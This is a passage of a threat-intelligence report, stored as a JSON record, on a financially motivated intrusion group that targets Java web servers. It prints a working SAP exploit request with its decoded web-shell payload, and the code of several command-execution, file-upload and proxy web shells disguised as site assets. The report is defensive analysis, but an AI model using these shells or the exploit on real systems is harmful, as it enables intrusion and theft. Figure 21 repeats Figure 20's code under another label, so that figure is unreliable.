{
    "id": "b7b19da3-d377-4768-8329-c2b28baaa84f",
    "created_at": "2023-11-01T02:06:04.223527Z",
    "updated_at": "2025-03-27T02:17:00.356721Z",
    "deleted_at": null,
    "sha1_hash": "b91cbd9e6f39cecc89fce0e6aaed8cd9ace56a7c",
    "title": "",
    "authors": "",
    "file_creation_date": "2023-10-30T18:33:43Z",
    "file_modification_date": "2023-10-30T18:33:43Z",
    "file_size": 809714,
    "plain_text": "# TG2003: Elephant Beetle UNCOVERING AN ORGANIZED FINANCIAL-THEFT OPERATION\n\n##### January 2022\n\n Contributors: Amnon Kushnir Noam Lifshitz Yoav Mazor Oren Biderman\n\n\n-----\n\n### Overview\n\n The Sygnia Incident\n\n Response team\n\n recently identified an\n\n organized and\n\n experienced threat\n\n group siphoning off\n\n funds from businesses in\n\n the financial sector by\n\n patiently studying the\n\n targets’ financial\n\n systems, injecting\n\n fraudulent transactions\n\n hidden among regular\n\n activity, and ultimately\n\n stealing millions of\n\n dollars. This group uses\n\n an array of tools and\n\n scripts to operate\n\n undetected for vast\n\n amounts of time.\n\n Sygnia refers to this\n\n threat as Elephant\n\n Beetle.\n\n1 https://www.mandiant.com/resources/fin13cybercriminal-mexico\n\n\nFor the past two years, Sygnia’s Incident Response (IR) team has been\ntracking a **financially** **motivated** **threat** **group** **targeting** **and** **infiltrating**\n**organizations** **from** **the** **finance** **and** **commerce** **sector** **in** **Latin** **America.**\nThe attack is relentless in its ingenious simplicity serving as an ideal tactic\nto hide in plain sight, without any need to develop exploits.\n\n**Using** **an** **arsenal** **of** **over** **80** **unique** **tools** **&** **scripts,** the group executes its\nattacks patiently over long periods of time, blending in with the target’s\nenvironment and going completely undetected while it quietly liberates\norganizations of exorbitant amounts of money. We are dubbing this\ngroup – **Elephant** **Beetle.**\n\nElephant Beetle seems to primarily focus on the Latin American market,\nbut that doesn’t mean that organizations that are not based there are\nsafe. Sygnia’s IR team discovered and responded to an incident at a\nU.S. based company with an operations branch in Latin America. As\nsuch, both regional and global organizations should be on their guard.\n\nThe group is highly proficient with Java based attacks and, in many\ncases, **target** **legacy** **Java** **applications** **running** **on** **Linux-based**\n**machines** **as** **the** **means** **for** **initial** **entry** to the network. Not only that, the\ngroup even deploys their own complete Java Web Application on the\nvictim machine to do their bidding while the machine also runs the\nintentional application.\n\nThis report is a technical play-by-play of the Elephant Beetle attack as\ndetected, observed and mitigated by Sygnia’s IR team. Elephant Beetle\nresembles the group tracked by Mandiant as FIN13[1].\n\nElephant Beetle operates in a well-organized and stealthy pattern,\nefficiently executing each phase of its attack plan once inside a\ncompromised network:\n\n1. During the first phase, which can span up to a month, the\ngroup focuses on **building** **operational** **cyber** **capabilities** in\nthe compromised victim’s network. The group studies the\ndigital landscape and plants backdoors while customizing its\ntools to work within the victim’s network.\n\n2. The group then spends several months studying **the** **victim’s**\n**environment,** **focusing** **on** **the** **financial** **operation** and\nidentifying any flaws. During this stage, it observes the\nvictim’s software and infrastructure to understand the\ntechnical process of legitimate financial transactions.\n\n3. The group can then **inject** **fraudulent** **transactions** into the\nnetwork. These transactions mimic legitimate behavior and\nsiphon off incremental amounts of money from the victim, a\nclassic salami tactic. Although the amount of money stolen\nin a single transaction may seem insignificant, the group\nstacks numerous transactions to what amounts to millions of\ndollars before the group moves on.\n\n**4.** If during its efforts any fraudulent activity is discovered and\nblocked, they **then** **simply** **lay** **low** for a few months only to\nreturn and target a different system.\n\n2\n\n\n-----\n\n### Table of Contents\n\n**Overview .................................................................................................................................................................................................... 2**\n\n**The** **MO:** **Tactics,** **Techniques** **and** **Procedures ................................................................................................................................. 4**\n\n**When** **the** **attacker** **uses** **pen** **testing** **tactics ..................................................................................................................................... 9**\n\n**From** **infiltration** **to** **victimization ......................................................................................................................................................... 11**\n\n**Elephant** **Beetle** **–** **Attribution ............................................................................................................................................................... 23**\n\n**Hunting** **and** **defending** **against** **Elephant** **Beetle** **(a.k.a.** **“Elefante”) ....................................................................................... 24**\n\n**Indicators** **of** **Compromise ................................................................................................................................................................... 25**\n\nWeb Shells File Names and MD5 Hashes ......................................................................................................................................... 25\n\nMalicious WAR File Names and MD5 Hashes ................................................................................................................................. 27\n\nCustom Java Tools Files Names and MD5 Hashes ........................................................................................................................ 27\n\nAdditional Tools File Names and MD5 Hashes ............................................................................................................................... 27\n\nYARA Signatures ..................................................................................................................................................................................... 29\n\nMITRE ATT&CK Breakdown ................................................................................................................................................................... 32\n\n**About** **Sygnia .......................................................................................................................................................................................... 33**\n\n3\n\n\n-----\n\n## The MO: Tactics, Techniques and Procedures\n\n### Elephant Beetle’s target of choice\n\nThis group uses standard procedure cyberattack techniques, especially by focusing on existing software with well\nknown—but likely unpatched—vulnerabilities.\n\nThe group’s preferred targets are Java-based web servers, typically WebSphere and WebLogic. They exploit web\nservers using known vulnerabilities to infiltrate organizations. The compromised servers are then used by the threat\nactors for persistent access vectors to the network, and as pivot points for credential harvesting activities and\nlateral movement to additional assets in the network.\n\nIn the incidents Sygnia responded to, the group was observed leveraging default credentials for authenticating\nmyWebMethods (“WMS”) and QLogic web management interface. For example, the group leveraged the\ndefault password “manage” of the privileged system user ‘sysadmin’ of WMS servers. In addition, the threat group\nexploited four vulnerabilities (three of them are recorded and published as CVEs) to gain access to the network:\n\n**1.** **Primefaces** **Application** **Expression** **Language** **Injection** **(CVE-2017-1000486)**\n\n_Primetek_ _Primefaces_ _5.x_ _is_ _vulnerable_ _to_ _a_ _weak_ _encryption_ _flaw_ _resulting_ _in_ _remote_ _code_ _execution.[2]_\n\n**2.** **WebSphere** **Application** **Server** **SOAP** **Deserialization** **Exploit** **(CVE-2015-7450)**\n\n_Serialized-object_ _interfaces_ _in_ _certain_ _IBM_ _analytics,_ _business_ _applications,_ _cognitive,_ _IT_ _infrastructure,_ _and_\n_mobile_ _and_ _social_ _products_ _allow_ _remote_ _attackers_ _to_ _execute_ _arbitrary_ _commands_ _via_ _a_ _crafted_ _serialized_\n_Java_ _object,_ _related_ _to_ _the_ _InvokerTransformer_ _class_ _in_ _the_ _Apache_ _Commons_ _Collections_ _library.[3]_\n\n**3.** **SAP** **NetWeaver** **Invoker** **Servlet** **Exploit** **(CVE-2010-5326)**\n\n_The_ _Invoker_ _Servlet_ _on_ _SAP_ _NetWeaver_ _Application_ _Server_ _Java_ _platforms,_ _possibly_ _before_ _7.3,_ _does_ _not_ _require_\n_authentication,_ _which_ _allows_ _remote_ _attackers_ _to_ _execute_ _arbitrary_ _code_ _via_ _an_ _HTTP_ _or_ _HTTPS_ _request,_ _as_\n_exploited_ _in_ _the_ _wild_ _in_ _2013_ _through_ _2016,_ _aka_ _a_ _Detour_ _attack.[4]_\n\n**4.** **SAP** **NetWeaver** **ConfigServlet** **Remote** **Code** **Execution** **(EDB-ID-24963)**\n\n_A_ _remote_ _command_ _execution_ _vulnerability_ _has_ _been_ _reported_ _in_ _SAP_ _NetWeaver._ _The_ _vulnerability_ _is_ _due_ _to_\n_insufficient_ _validation_ _in_ _SAP_ _ConfigServlet_ _handling_ _of_ _incoming_ _GET_ _requests._ _By_ _sending_ _a_ _specially-crafted_\n_GET_ _request,_ _an_ _attacker_ _could_ _exploit_ _this_ _vulnerability_ _to_ _inject_ _and_ _execute_ _arbitrary_ _commands_ _on_ _the_\n_system.[5]_\n\nThe basic payload for these exploits was either a simple obfuscated web shell enabling remote code execution,\nor a series of exploitations, running different commands on the target machine. Following the initial web shell, a\nset of both open-source web shells, such as “JspSpy,”[6], “reGeorge,”[7], “MiniWebCmdShell,”[8], “Vonloesch Jsp File\nBrowser 1.2”[9] and custom web shells were uploaded separately or as a bundle and were used by the group.\n\nBelow is an example of a web request that was sent by the threat group to one of the victim’s SAP portals, which\nexploits the SAP ConfigServlet Remote Code Execution and contains a one-line command that creates a web\nshell.\n\n2 https://nvd.nist.gov/vuln/detail/CVE-2017-1000486\n\n3 https://nvd.nist.gov/vuln/detail/CVE-2015-7450\n\n4 https://nvd.nist.gov/vuln/detail/CVE-2010-5326\n\n5 [https://www.checkpoint.com/defense/advisories/public/2015/cpai-2015-0672.html/](http://www.checkpoint.com/defense/advisories/public/2015/cpai-2015-0672.html/)\n\n6 https://github.com/tennc/webshell/blob/master/jsp/JspSpy.jsp\n\n7 https://github.com/sensepost/reGeorg\n\n8 https://github.com/xl7dev/WebShell/blob/master/Php/ava%20Server%20Faces%20MiniWebCmdShell%200.2%20by%20HeartLESS.php\n\n9 [https://www.vonloesch.de/filebrowser.html](http://www.vonloesch.de/filebrowser.html)\n\n4\n\n\n-----\n\n```\n/ctc/servlet/com.sap.ctc.util.configservlet?param=com.sap.ctc.util.filesystemconfig;execute_cmd;cmdline=s\nh%20-c%20$@|sh%20.%20echo%20perl%20-mmime::base64%20-0777%20le%20%27print%20decode_base64(%22PCUobmV3IGphdmEuaW8uRmlsZU91dHB1dFN0cmVhbShyZXF1ZXN0LmdldFBhcmFtZXRlcigi\nZiIpKSkud3JpdGUocmVxdWVzdC5nZXRQYXJhbWV0ZXIoInQiKS5nZXRCeXRlcygpKTslPiAK%22)%27%20%3e%20./root/com.sap.js\np\n\n```\n\n**Figure** **1:** **The** **URL** **that** **was** **requested** **by** **the** **threat** **group.**\n\n```\nsh -c $@|sh . echo perl -mmime::base64 -0777 -le 'print\ndecode_base64(PCUobmV3IGphdmEuaW8uRmlsZU91dHB1dFN0cmVhbShyZXF1ZXN0LmdldFBhcmFtZXRlcigiZiIpKSkud3JpdGUocmV\nxdWVzdC5nZXRQYXJhbWV0ZXIoInQiKS5nZXRCeXRlcygpKTslPiAK)' > ./root/com.sap.jsp\n\n```\n\n**Figure** **2:** **The** **URL-decoded** **version** **of** **the** **remote** **command** **to** **execute** **by** **the** **exploit.**\n\n```\n<%(new java.io.FileOutputStream(request.getParameter(f))).write(request.getParameter(t).getBytes());%>\n\n```\n\n**Figure** **3:** **The** **Base64** **decoded** **content** **that** **was** **written** **to** **the** **./root/com.sap.jsp,** **which** **is** **a** **basic** **file** **uploader** **Web** **shell.**\n\n\n5\n\n\n-----\n\n#### Hiding in plain sight\n\nA great deal of this attack is focused on going undetected for extended periods of time. This is done through\nmultiple means, including laying low and engaging in minimal to no activity, so the attackers remain blended into\nthe background. Their primary goal at this stage is almost solely surveillance and research.\n\nWith the goal of blending into the environment, Elephant Beetle will often try and mimic its surroundings and likes\nto choose the most innocuous surroundings it can. For example, the first deployed web shells were mainly dropped\ninto the resources folders of each web application, disguising themselves as fonts, images, CSS, and JS resources,\nwith similar names to original files in these folders - but with a ‘.JSP’ extension.\n```\n <web_application_root_folder>/\n ├── css/\n │ ├── bootstrap.min.css\n │ └── bootstrap.min.css.jsp\n ├── js/\n │ ├── bootstrap.min.js\n │ └── bootstrap.min.jsp\n ├── img/\n │ ├── favicon.ico\n10. │ ├── favicon.ico.jsp\n11. └── fonts/\n12. ├── glyphicons-halflings-regular.svg\n13. ├── glyphicons-halflings-regular.woff\n14. └── glyphicons-halflings-regular.woff.jsp\n\n```\n**Figure** **4:** **Example** **of** **web** **shells** **naming** **and** **location** **convention** **inside** **a** **website** **resource** **folders.**\n\n#### Masquerading as a legitimate package\n\nWhen the attackers are ready to engage and execute their attack, they level up their aggressiveness. For\nexample, they will often leverage compromised administrative accounts of the target web servers for deploying\nmalicious WAR (Web Application Resource/Web Application Archive) files containing a variety of web shells, each\nwith different capabilities.\n\nWAR files are used for distributing a collection of web page files and resources, wrapped in a single archive file. By\nusing WAR files, the group distributes/deploys multiple tools using a single file. The WAR file that is deployed by the\ngroup is often named with a variation of the word example to masquerade as a legitimate package, e.g.,\n‘wsexample.war’, ‘wsexamples.war’, ‘examples.war’ and ‘exampl3s.war’.\n\nThe following figure shows the original file structure of a malicious WAR named ‘wsexample.war’, which was found\nby Sygnia during an incident response investigation. Several selected web shells are presented in the next figures.\n```\n wsexample/\n ├── META-INF/\n │ └── …\n ├── WEB-INF/\n │ └── …\n ├── .login-n.jsp // Linux Command Execution Web shell\n ├── .login-w.jsp // Windows Command Execution Web shell\n ├── ex-ample.jsp // File Uploader Web shell\n ├── _example.jsp // reGeorge Web shell\n10. ├── up-base.jsp // Base64 encoded File Uploader Web shell\n11. ├── id_win.jsp // jsp File browser 1.2 (Windows configured)\n12. └── one-lin.jsp // Obfuscated Linux Command Execution Web shell\n\n```\n**Figure** **5:** **Example** **of** **the** **malicious** **‘wsexample.war’** **WAR** **file** **structure,** **containing** **web** **shells** **with** **their** **original** **names** **and** **purpose.**\n\n6\n\n```\n// Linux Command Execution Web shell\n// Windows Command Execution Web shell\n// File Uploader Web shell\n// reGeorge Web shell\n// Base64 encoded File Uploader Web shell\n// jsp File browser 1.2 (Windows configured)\n// Obfuscated Linux Command Execution Web shell\n\n```\n```\n├── glyphicons-halflings-regular.svg\n├── glyphicons-halflings-regular.woff\n└── glyphicons-halflings-regular.woff.jsp\n\n```\n```\n├── bootstrap.min.css\n└── bootstrap.min.css.jsp\n\n```\n```\n├── favicon.ico\n├── favicon.ico.jsp\n\n```\n```\n1.\n2.\n3.\n4.\n5.\n6.\n7.\n8.\n9.\n\n```\n```\n11. └── fonts/\n\n```\n```\n9. │\n10. │\n\n```\n```\n├── img/\n\n```\n```\n└── …\n\n```\n```\n│\n│\n\n```\n```\n│\n\n```\n\n-----\n\nThis technique is considered to be super-persistent on some web servers, specifically WebSphere and\nWebMethods, due to the fact that removal of the web shell files is insufficient, as the web pages are being loaded\nand held in the server’s process memory. A compiled version of the web shell is also being kept in the form of\n.class files that are being loaded during the server startup. More information about the nature of the .class files will\nbe provided further down in the report in the **Hunting** **and** **defending** **against** **Elephant** **Beetle** **(a.k.a.** **“Elefante”)**\nchapter.\n\nOne of the methods the threat group has used for obtaining administrative credentials is browsing through local\nfiles on the compromised machines for clear-text credentials inside scripts and configuration files.\n\nIn several occurrences where a ‘WebSphere Application Server (WAS)’ was compromised, the threat actor has\nsearched recursively through it using the string, ‘wasadmin’, which is the default administrator user for the\nWebSphere web interface. Several configuration files reside on the server itself (e.g., ‘server.xml’) and contain an\nencoded version of credentials by default. The default encoding format of passwords saved by WebSphere is\n{xor}, which can be easily decoded by a variety of open-source scripts.\n\nAfter obtaining the admin credentials for the WebSphere application, the threat group leveraged them for\nlogging into the WebSphere admin interface and deploying the WAR application.\n\nAdditionally, the threat group deployed malicious WAR files via an Apache Tomcat Manager web interface of\nQLogic servers by accessing /manager/html/upload, a known exploit with a corresponding Metasploit module.\n\nAnother technique for WAR deployment that was used by the group was leveraging Tomcat auto-deploy\nmechanism by placing the malicious WAR under $CATALINA_BASE\\webapps folder on the compromised server.\n\nThe following code snippets are just a small part of the web shells that were identified inside the malicious WAR\nfiles (which were also deployed by using other methods mentioned in this chapter):\n\nSnippet of the ‘up-base.jsp’ web shell code, where the HTTP request parameter ‘f’ expected to be the target\nfilename and ‘t’ should contain the content of the file to be upload, Base64 encoded:\n\n```\n<%if(request.getParameter(f)!=null)(new\njava.io.FileOutputStream(request.getParameter(f))).write(javax.xml.bind.DatatypeConverter.parseBase64Bina\nry(request.getParameter(t)));%>\n\n```\n\n**Figure** **6:** **The** **file** **content** **of** **‘up-base’.jsp** **as** **was** **found** **inside** **‘wsexmaple.war.’**\n\nSnippet of the ‘.login-w.jsp’ Web shell code, where the HTTP request parameter ‘zc’ expected to be the\ncommand line to execute by ‘cmd.exe /c’ on the target machine:\n\n```\n<%@ page import=java.util.Map,java.util.Map.Entry,java.util.*,java.io.* %><% try {String[] command =\n{cmd.exe, /c, request.getParameter(zc)}; ProcessBuilder probuilder = new ProcessBuilder( command\n);Process process = probuilder.start(); InputStream is = process.getInputStream(); InputStreamReader isr\n= new InputStreamReader(is); BufferedReader br = new BufferedReader(isr); String line; while ((line =\nbr.readLine()) != null) {out.println(line);};} catch (Exception e) {}; %>\n\n```\n\n**Figure** **7:** **The** **file** **content** **of** **‘.login-w’.jsp** **as** **was** **found** **inside** **‘wsexmaple.war.’**\n\nSnippet of the ‘one-line.jsp’ Web shell obfuscated code, where the HTTP request parameter ‘zc’ expected to be\nthe command line to execute by ‘/bin/bash -c’ on the target machine.\n\n```\n<%@ page import=java.util.Map,java.util.Map.Entry,java.util.*,java.io.* %><% try {String[] NL =\n{TbinTsh.replaceAll(T,/), -c, request.getHeader(zc)}; ProcessBuilder KV = new ProcessBuilder( NL\n);Process GRQZ = KV.start(); InputStream Z = GRQZ.getInputStream(); InputStreamReader ZW = new\nInputStreamReader(Z); BufferedReader ZSORHPBJTWY = new BufferedReader(ZW); String VIUTZN; while ((VIUTZN\n= ZSORHPBJTWY.readLine()) != null) {out.println(VIUTZN);};} catch (Exception e) {}; %>\n\n```\n\n**Figure** **8:** **The** **file** **content** **of** **‘one-lin.jsp’** **as** **was** **found** **inside** **‘wsexmaple.war’.**\n\n\n7\n\n\n-----\n\n#### Nothing suspicious to see here\n\nAnother technique that was used by the threat actor was modifying or replacing completely the default web\npage files. – i.e., replacing the iisstart.aspx or default.aspx on IIS web servers. Using this technique allowed the threat\ngroup two things – the first is an almost guaranteed access to their web shell from other servers or from the internet,\nbecause the routes for this are often allowed by default. The second is that access to such pages is not classified\nas suspicious. And in the default.aspx case specifically, the page that is being accessed is the root page (/), which\nis mostly accessed by regular users and is considered normal behavior.\n\nSnippet of the ‘iisstart.aspx’ web shell code, written in VB and slightly obfuscated.\n\n```\n<%@ Page AspCompat=true Language=VB %>\n<script runat=server>\n  Protected Sub Page_Load(ByVal sender As Object, ByVal e As System.EventArgs)\n     if Request.Form(submit) <> then\n       Dim secobject, intReturn, strPResult,sect,objsect\n       sect = Request.Form(sect)\n       Response.Write (Running: & sect & <br />)\n       secobject = CreateObject(Replace(Replace(WXcrZpt.Xhell,X,S),Z,i))\n       objsect = secobject.Exec(sect)\n       strPResult = objsect.StdOut.Readall()\n      Response.Write (<br><pre> & replace(replace(strPResult,<,<),vbCrLf,<br>) & </pre>)\n      secobject = nothing\n     end if\n  End Sub\n</script><html xmlns=http://www.w3.org/1999/xhtml ><head runat=server><title>Untitled\nPage</title></head><body><form id=form1 runat=server></form></body></html>\n\n```\n\n**Figure** **9:** **The** **file** **content** **of** **‘iisstart’.aspx.**\n\n\n8\n\n\n-----\n\n### When the attacker uses pen testing tactics\n\nAfter compromising a web server, the threat group upload a custom Java-written scanner that supports scanning\nIP range/list of IP addresses for a specific port or for an HTTP interface. The tool accepts parameters like URI to scan,\nUser-Agent, and more from a configuration file and then writes the result to an output file.\n\nThis tool was widely used by the group and was found on almost every compromised asset. It is used to scan targets\nin the asset’s proximity and then leveraged to identify installed applications, which could be exploited.\n\nThe threat group also often downloaded the source code of the application residing on that server. This act,\ncombined with the threat group scans for specific proprietary web interfaces, indicates that they have extensive\nunderstanding and knowledge in the field of pen testing.\n\nCode snippet from the tool:\n\n```\npublic class MainApp {\n public static int MAX_THREAD = 10;\n public static Config config;\n public static void main(String[] args) {\n  if (args.length != 2) {\n   System.out.println(\\n\\t[+] (1.0) Usage: conFile ip.ip.ip.*|file\\n);\n   System.exit(0);\n  }\n…\n       if (ar.size() < MAX_THREAD) {\n        ObserverNotifier observer1 = new ObserverNotifier();\n        PortScanner observable1 = init(currHost, config, observer1);\n        Thread thread = new Thread(observable1);\n        thread.start();\n        ar.add(thread);\n…\n private static PortScanner init(String ipAddress, Config config, ObserverNotifier observer) {\n  PortScanner observable = new PortScanner();\n  observable.setTarget(ipAddress);\n  observable.setConfig(config);\n  observable.addObserver(observer);\n  return observable;\n }\n\n```\n\n**Figure** **10:** **Snippet** **from** **the** **source** **code** **of** **the** **Java** **scanner** **(named** **‘p.j’).**\n\n```\nname=Generic\nverbose=false\nReq.redirect=true\nReq.ssl=false\nReq.revDns=true\nReq.timeout=3000\nReq.path=<Requested URI>\nReq.method=GET\nReq.port0=9080\nReq.header0=User-Agent: Mozilla/5.0 (Windows NT 6.1; rv:52.0) Gecko/20100101 Firefox/52.0\nRes.status0=200\n9080 of < Host >/< IP > | RuleEval: / Code: 404 / Server: null ;\n9080 of < Host >/< IP > | RuleEval: / Code: 404 / Server: null ;\n9080 of < Host >/< IP > | RuleEval: Found as status 200, / Code: 200 / Server: null ;\n\n```\n\n**Figure** **11:** **Output** **file** **content** **of** **a** **generic** **URI** **scan** **conducted** **on** **<host>:9080** **with** **the** **above-mentioned** **tool.**\n\nAdditional port scanner tools that have common Java code with the abovementioned tool has been identified,\nmost of them without a complex URL scan feature, but have different features such as TLS fingerprinting. One of\nthe port scanner’s variants that was found (under the name p.j), contains a usage document that suggests that it\nis an updated version of the tool (1.2 comparing to 1.0), but actually supports only port scanning of IP range/list of\nIP addresses.\n\n9\n\n\n-----\n\n```\npublic class MainApp {\n public static int MAX_THREAD = 100;\n public static void main(String[] args) {\n  if (args.length < 3) {\n   System.out.println(\\n\\t[1.2][+]Usage: ip.ip.ip.*|file startPort endPort\\n);\n   System.exit(0);\n  }\n  File hosts = new File(args[0]);\n  if (hosts.exists()) {\n   try {\n    BufferedReader br = new BufferedReader(new FileReader(hosts));\n    int count = 0;\n    ArrayList<Thread> ar = new ArrayList();\n    String currHost;\n\n```\n\n**Figure** **12:** **Snippet** **from** **the** **source** **code** **of** **a** **newer** **version** **of** **the** **same** **Java** **scanner** **(named** **also** **‘p.j’).**\n\nAnother scanning-related tool that was identified by Sygnia is ‘SslTest’. This is also a JAR file (originally named ‘sl.j’)\nthat allows the threat group to perform SSL fingerprinting to a remote host and indicates them specifically\nregarding a certificate expiry date.\n\n```\npublic class SslTest {\n public static void main(String[] args) throws Exception {\n  if (args.length != 2) {\n   System.out.println(Usage: host port);\n   return;\n  }\n…\n   socket.startHandshake();\n   Certificate[] certs = socket.getSession().getPeerCertificates();\n   System.out.println(Certs retrieved: + certs.length);\n   for (int i = 0; i < certs.length; i++) {\n    Certificate cert = certs[i];\n    System.out.println(Certificate is: + cert);\n    if (cert instanceof X509Certificate)\n     try {\n       ((X509Certificate)cert).checkValidity();\n       System.out.println(Certificate is active for current date);\n     } catch (CertificateExpiredException cee) {\n       System.out.println(Certificate is expired);\n\n```\n\n**Figure** **13:** **Snippet** **from** **the** **source** **code** **of** **the** **SSL** **certificates** **scanner.**\n\nIn addition, when compromising a Windows machine in a domain environment, the threat group leveraged the\nNet binary and queried information regarding high privileges domain accounts and groups (Domain Admins,\nEnterprise Admins). An example of that is a simple batch script that includes a file containing a list of hostnames\nand for each executes net view command for enumeration of open shares on the target machines.\n\n```\n@echo off\nfor /f tokens=* %%a in (C:\\temp\\net.txt) do (\n echo trying %%a: >> C:\\temp\\log.txt\n net view %%a >> C:\\temp\\log.txt 2>&1\n)\n\n```\n\n**Figure** **14:** **Batch** **Script** **used** **to** **query** **open** **shares** **on** **machines** **from** **‘C:\\temp\\net.txt’.**\n\nThe threat group also executed a Microsoft-developed script named ‘querySpn.vbs’, which was used to query\nService Principal Names within the domain. This tool is used for discovering potential targets and as a preparation\nfor a future Kerberoasting, where tickets of privileged accounts with potentially crack-able passwords will be\nissued.\n\n10\n\n\n-----\n\n### From infiltration to victimization\n\nBecause Elephant Beetle tends to exploit externally facing servers as the infiltration vector, the first servers that\nwere discovered at the target’s network are the web applications infrastructure and other servers that are related\nto the compromised web application server and are accessible from their environment. In compromising the\nmentioned internal servers, the group leveraged either compromised credentials they gathered or similar exploits\nthat were used to infiltrate the externally facing servers.\n\nThe access to and from the compromised assets are mainly achieved by the group’s web shells and Java tools,\nboth custom and open source, that provide tunneling capabilities of TCP packets and HTTP requests.\n\nThe threat group move laterally within the network mainly through web application servers and SQL servers,\nleveraging known techniques such as Windows APIs (SMB/WMI) and ‘xp_cmdshell’, combined with custom remote\nexecution volatile backdoors.\n\nFor transferring tools and their outputs between compromised machines, the group leverage either a custom Java\nuploader/downloader tool or various web shells that have file uploading/downloading capabilities.\n\nBelow is a high-level diagram that describes the lateral movement and access paths HTTP requests took, tunneled\nfrom an internet-facing server to an internal web server, and from that to other internal servers in more inner zones.\n\nEach of the tools and techniques that are presented in the following diagram will be discussed in this chapter.\n\n**Figure** **15:** **Lateral** **movement** **flow** **chart** **of** **the** **threat** **actor.**\n\n**Figure** **16:** **The** **decapsulation** **of** **the** **HTTP** **requests** **sent** **for** **executing** **PowerShell** **backdoor** **on** **SQL** **instance,** **ordered** **by** **the** **stages** **on** **Figure** **15.**\n\n11\n\n\n-----\n\nAfter leveraging XP_CMDSHELL to execute the PowerShell backdoor on the MS-SQL server, the threat actor used the\nbackdoor as the main remote execution tool on the compromised server and was able to continue its lateral\nmovement within the core internal network. The figure below depicts a lateral movement scenario from the\ncompromised MS-SQL server to a core server, using WMI access with privileged credentials.\n\n**Figure** **17:** **Lateral** **movement** **flow** **chart** **of** **the** **threat** **actor.**\n\n**Figure** **18:** **The** **decapsulation** **of** **the** **HTTP** **requests** **sent** **for** **executing** **WmiExec.vbs** **on** **a** **core** **server** **via** **the** **PowerShell** **backdoor** **on** **the** **SQL**\n\n**instance,** **ordered** **by** **the** **stages** **on** **Figure** **17.**\n\n12\n\n\n-----\n\n#### They put a hex (string) on you\n\nElephant Beetle deploy several tools for tunneling HTTP requests to web shells on internal web servers, which have\nless restricted access to other internal resources. One tool the group used was a custom web shell that receives HTTP\nparameters of a target host port and an encoded HTTP request payload (as a hex-string), creates a connection to\nthe target machine, sends the request and prints the response.\n\n```\n<%@ page buffer=none %><%@page import=java.io.*, java.net.*, java.security.*,javax.net.ssl.*%><%!\nbyte[] hexStringToByteArray(String s) {\n  int len = s.length();\n  byte[] data = new byte[len / 2];\n  for (int i = 0; i < len; i += 2) {\n    data[i / 2] = (byte) ((Character.digit(s.charAt(i), 16) << 4)\n                + Character.digit(s.charAt(i+1), 16));\n  }\n  return data;\n}\n%><%\nString host=request.getParameter(host);\nString port=request.getParameter(port);\nString requestx=request.getParameter(request);\n…\ntry{\n     if(host!=null && port!=null){\n           InputStream inSocket = null;\n           OutputStream outSocket = null;\n           if(host.indexOf(do-ssl-zero)>=0 && requestx!=null){\n                host=host.replaceAll(do-ssl-zero\\\\.,);\n                SSLContext context=SSLContext.getInstance(SSL);\n                context.init(null, trustAllCerts, new java.security.SecureRandom());\n                SSLSocketFactory factory=context.getSocketFactory();\n                if(port==80){\n                      port=443;\n                }\n                SSLSocket sslsocket = (SSLSocket) factory.createSocket();\n                sslsocket.connect(new InetSocketAddress(host,\nInteger.parseInt(port)),30000);\n                sslsocket.setSoTimeout(30000);\n                outSocket = sslsocket.getOutputStream();\n                inSocket = sslsocket.getInputStream();\n           } else {\n                Socket socket = new Socket();\n                socket.connect(new InetSocketAddress(host, Integer.parseInt(port)), 30000);\n                if(requestx!=null){\n                      inSocket = socket.getInputStream();\n                      outSocket = socket.getOutputStream();\n                } else {\n                      out.print(true);\n                }\n           }\n           if(outSocket!=null){\n                outSocket.write(hexStringToByteArray(requestx));\n                int character;\n                while ((character = inSocket.read()) != -1) {\n                      out.print((char)character);\n                }\n           }\n     }\n} catch (Exception e) { out.println(An exception occurred: + e.getMessage()+<br/>\\n); } %>\n\n```\n\n**Figure** **19:** **Code** **snippet** **of** **the** **HTTP** **Proxy** **Web** **shell.**\n\n\n13\n\n\n-----\n\nOne of the Java tools that was leveraged to tunnel traffic is a custom port forwarding tool that uses the opensource library JSch by JCraft based on a specific code implementation example[10] from the JCraft website. The\ncustomization was mainly done to add flexibility to the threat group when executing it with providing command\nline parameters or a configuration file.\n\n```\npublic class PortForwardingR {\n public static void main(String[] arg) {\n…\n  } else {\n   System.out.println(\\t[+] usage: [ [ username@hostname port port:host:hostport pass ] | file ]);\n   System.exit(0);\n  }\n  try {\n   JSch jsch = new JSch();\n   String user = host.substring(0, host.indexOf('@'));\n   host = host.substring(host.indexOf('@') + 1);\n   Session session = jsch.getSession(user, host, port);\n   if (!kex.equals())\n    session.setConfig(kex, kex);\n   int rport = Integer.parseInt(foo.substring(0, foo.indexOf(':')));\n   foo = foo.substring(foo.indexOf(':') + 1);\n   String lhost = foo.substring(0, foo.indexOf(':'));\n   int lport = Integer.parseInt(foo.substring(foo.indexOf(':') + 1));\n   session.setPassword(pass);\n   session.setConfig(StrictHostKeyChecking, no);\n   session.connect();\n   session.setPortForwardingR(rport, lhost, lport);\n\n```\n\n**Figure** **20:** **Code** **snippet** **of** **the** **port** **forwarding** **Java** **tool.**\n\nAnother Java tool that was leveraged to tunnel traffic is a JSOCKS-like tool. This tool is a custom Java compiled\nversion of the open source JSOCKS tool[11] and can be executed with command-line parameters or with a\nconfiguration file and its path as the parameter.\n\n```\npublic class PortForwardingR {\n public static void main(String[] arg) {\n…\n  } else {\n   System.out.println(\\t[+] usage: [ [ username@hostname port port:host:hostport pass ] | file ]);\n   System.exit(0);\n  }\n  try {\n   JSch jsch = new JSch();\n   String user = host.substring(0, host.indexOf('@'));\n   host = host.substring(host.indexOf('@') + 1);\n   Session session = jsch.getSession(user, host, port);\n   if (!kex.equals())\n    session.setConfig(kex, kex);\n   int rport = Integer.parseInt(foo.substring(0, foo.indexOf(':')));\n   foo = foo.substring(foo.indexOf(':') + 1);\n   String lhost = foo.substring(0, foo.indexOf(':'));\n   int lport = Integer.parseInt(foo.substring(foo.indexOf(':') + 1));\n   session.setPassword(pass);\n   session.setConfig(StrictHostKeyChecking, no);\n   session.connect();\n   session.setPortForwardingR(rport, lhost, lport);\n\n```\n\n**Figure** **21:** **Code** **snippet** **of** **the** **JSOCKS** **tool.**\n\n10 [http://www.jcraft.com/jsch/examples/PortForwardingL.java.html](http://www.jcraft.com/jsch/examples/PortForwardingL.java.html)\n11 https://github.com/jitsi/jsocks\n\n\n14\n\n\n-----\n\n#### From backdoor to backdoor\n\nTo facilitate the lateral movement, the group was observed using two different one-liner backdoors that were\nplanted remotely on a machine via various techniques.\n\nThe first backdoor is a Base64 encoded PowerShell one-liner backdoor that simulates a web server and provides\nremote code execution capabilities. 